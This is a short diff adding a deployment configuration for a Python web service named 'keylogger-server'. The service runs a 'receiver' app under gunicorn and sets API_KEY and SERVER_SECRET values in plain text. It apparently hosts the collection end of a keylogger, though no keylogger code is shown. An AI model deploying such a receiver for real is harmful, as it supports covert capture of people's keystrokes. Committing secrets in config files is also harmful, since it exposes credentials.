@@ -1,0 +1,11 @@
+services:
+  - type: web
+    name: keylogger-server
+    env: python
+    buildCommand: pip install -r requirements.txt
+    startCommand: gunicorn receiver:app
+    envVars:
+      - key: API_KEY
+        value: XzS9Hab8fl86GHSsQwVcZwP9J92ETrZC6NCQ5r1tIVQ
+      - key: SERVER_SECRET
+        value: 6-aPmDrsAggbBeL3Fs0ePfQgO76xEw7u4Iju8He959s
